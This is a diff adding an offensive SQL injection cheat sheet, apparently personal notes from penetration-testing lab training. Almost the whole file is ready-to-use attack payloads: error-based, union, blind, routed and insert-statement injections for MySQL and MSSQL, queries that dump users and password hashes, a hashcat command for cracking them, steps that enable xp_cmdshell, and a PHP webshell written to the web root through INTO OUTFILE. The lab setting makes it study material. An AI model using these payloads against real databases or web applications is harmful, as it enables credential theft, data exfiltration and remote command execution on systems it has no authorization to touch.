@@ -1,0 +1,144 @@
+### SQLI ###
+
+
+#############
+## db type ##
+#############
+## mysql
+mysql -u root -p'root' -h 192.168.50.16 -P 3306                                 # connect to mysql
+> select version();                                                             # mysql version
+> select system_user();                                                         # current database user
+> show databases;                                                               # list db
+> SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';     # select a user
+
+## mssql
+impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth           # -windows-auth: NTLM auth
+mssqlclient.py Administrator:Lab123@192.168.50.18 -windows-auth
+> SELECT @@version;                                                             # mssql version
+> SELECT name FROM sys.databases;                                               # list db
+> select uid,status,name from sys.sysusers;                                     # list sysusers
+> SELECT * FROM offsec.information_schema.tables;                               # get tables from offsec db
+> select * from offsec.dbo.users;                                               # select from users table
+# user list
+> select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
+> hashcat -m 1731 mssql.hash    ~/perso/secu/dict/rockyou.txt --force		# start with 0x0200
+
+
+#################
+## Error based ##
+#################
+## error check
+offec'                                                                          # exptect error
+
+## basic
+offsec' OR 1=1 -- //                                                            # basic
+        SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --                 # expected
+' or 1=1 in (select @@version) -- //                                            # get version in error
+' or 1=1 in (SELECT password FROM users) -- //                                  # try dump password
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //         # dump pass from 1 user
+
+
+###########
+## union ##
+###########
+## vuln query
+$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
+
+## get nb column
+' ORDER BY 1-- //
+' ORDER BY 2-- //                                                               # until get unknown col
+
+## enum users
+' UNION SELECT database(), user(), @@version, null, null -- //
+' UNION SELECT null, null, database(), user(), @@version  -- //                 # be careful of col type
+# enum colomn name, table name from current db
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+' UNION SELECT null, username, password, description, null FROM users -- //     # dump user table
+
+
+
+###########
+## blind ##
+###########
+## boolean based
+http://$h/blindsqli.php?user=offsec' AND 1=1 -- //                              # true if offsec exsit
+http://$h/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //       # sleep if true
+
+
+
+############
+## routed ##
+############
+## https://book.hacktricks.xyz/pentesting-web/sql-injection#routed-sql-injection
+a' union select 1#
+a' union select 0x332720616e6420313d3023 #
+a' union select 0x302720756e696f6e2073656c65637420312c322066726f6d20757365727323 #
+
+
+
+###############
+## on insert ##
+###############
+## https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#insert-statement---on-duplicate-key-update
+email=aae')#									# try to drop end of insert
+email=aaf'),('bbb','xxx','bbb')#						# multi insert
+email=aag'),('ccc','ccc',version())#						# try select version
+# drop schema, tables, etc
+email=aah'),('ddd','ddd',(select GROUP_CONCAT(schema_name) FROM information_schema.schemata))#
+email=aai'),('eee','eee',(select GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='c_webserveur_33'))#
+email=aaj'),('fff','fff',(select GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='flag'))#
+
+
+
+#################
+## xp_cmdshell ##
+#################
+# mssql
+impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+EXECUTE sp_configure 'show advanced options', 1;                                # show advanced option
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;                                          # enable cmdshell
+RECONFIGURE;
+EXECUTE xp_cmdshell 'whoami';                                                   # could exec cmd
+
+# mysql, outfile location need writable path
+' UNION SELECT "<?php system($_GET['cmd']);?>", null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+
+
+
+############
+## manual ##
+############
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+a' union select database() --
+a' union select GROUP_CONCAT(schema_name) FROM information_schema.schemata --
+a' union select GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='xxx' --
+a' union select GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='xxx' --
+a' union select GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=0x616263 --
+a' union select GROUP_CONCAT(user,0x3b,pass) FROM users --
+
+# time based
+admin123' UNION SELECT SLEEP(5);--
+admin123' UNION SELECT SLEEP(5),2;--
+admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
+
+# boolean based
+a' UNION SELECT 1,2,3;--
+a' UNION SELECT 1,2,3 where database() like '%';--
+a' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'bdd' and table_name like 'a%';--
+a' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'bdd' and table_name='users';--
+a' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='bdd' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
+a' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+
+
+
+
+
+
+
+
+
+
+
+
+
